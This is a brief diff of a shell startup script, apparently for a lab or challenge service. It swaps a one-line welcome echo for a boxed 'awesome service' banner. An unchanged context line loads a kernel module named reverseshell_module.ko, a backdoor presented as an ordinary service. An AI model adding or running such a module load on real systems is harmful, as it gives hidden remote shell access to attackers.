@@ -1,5 +1,12 @@
 #!/bin/sh
 
 insmod /reverseshell_module.ko
-echo "Welcome to your AWESOME service !"
+cat << EOF
+
+*******************************************
+* Welcome to my awesome service!          *
+* My awesome service is currently running *
+*******************************************
+
+EOF
 sleep 1000
